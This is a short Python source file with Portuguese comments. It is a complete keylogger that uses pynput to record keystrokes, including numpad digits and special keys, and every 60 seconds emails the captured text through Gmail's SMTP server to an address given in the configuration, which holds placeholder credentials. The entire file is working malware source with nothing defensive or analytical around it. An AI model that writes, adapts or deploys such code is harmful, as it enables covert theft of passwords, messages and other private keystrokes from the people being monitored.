from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#CONFIGURAÇÕES DE EMAIL
EMAIL_ORIGEM = "xxxxx@gmail.com"
EMAIL_DESTINO = "xxxxx@gmail.com"
SENHA_EMAIL = "xxxxx"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['to'] = EMAIL_DESTINO

        try:
            # Conexão com o servidor do Gmail
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
            print("[+] E-mail enviado com sucesso!")
        except Exception as e:
            print ("Erro ao enviar", e)

        # Limpa o log após tentar enviar (evita duplicar dados se falhar)
        log = ""

    #Agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        if key.char is not None:
            log += key.char
        else:
            raise AttributeError
    except AttributeError:
        # CORREÇÃO PARA OS NÚMEROS DO TECLADO LATERAL (NUMPAD)
        # Se a tecla tiver o código de varredura virtual entre 96 e 105 (0 a 9)
        if hasattr(key, 'vk') and 96 <= key.vk <= 105:
            numero = str(key.vk - 96)
            log += numero
        
        # Outras teclas especiais
        elif key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += " [BACKSPACE] "
        else:
            pass  # Ignora Shift, Ctrl, Alt, etc.

print("[*] Keylogger completo iniciado. Capturando letras, números e enviando por e-mail...")
enviar_email()

with keyboard.Listener(on_press=on_press) as listerner:
    listerner.join()